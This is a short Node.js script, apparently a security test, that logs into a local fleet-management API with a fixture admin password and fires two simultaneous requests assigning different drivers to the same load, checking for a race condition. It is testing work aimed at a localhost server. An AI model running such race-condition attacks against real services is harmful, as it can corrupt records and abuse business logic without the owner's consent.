const { compA, usersA, entitiesA } = require('../helper.js');

async function attack() {
  const tokenReq = await fetch('http://localhost:8080/api/v1/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: usersA.ADMIN.email, password: 'password123' })
  });
  const { access_token: token } = await tokenReq.json();

  const loadId = Object.keys(entitiesA.loads)[0];
  const driverId1 = Object.keys(entitiesA.drivers)[0];
  const vehicleId1 = Object.keys(entitiesA.vehicles)[0];
  
  const driverId2 = Object.keys(entitiesA.drivers)[1];
  const vehicleId2 = Object.keys(entitiesA.vehicles)[1];

  // Attack: Try to assign two different drivers to the same load concurrently
  const req1 = fetch(`http://localhost:8080/api/v1/fleet/loads/${loadId}/assign`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
    body: JSON.stringify({ driverId: driverId1, vehicleId: vehicleId1 })
  });
  
  const req2 = fetch(`http://localhost:8080/api/v1/fleet/loads/${loadId}/assign`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
    body: JSON.stringify({ driverId: driverId2, vehicleId: vehicleId2 })
  });

  const [res1, res2] = await Promise.all([req1, req2]);
  console.log("RACE 1:", res1.status, await res1.text());
  console.log("RACE 2:", res2.status, await res2.text());
}
attack();
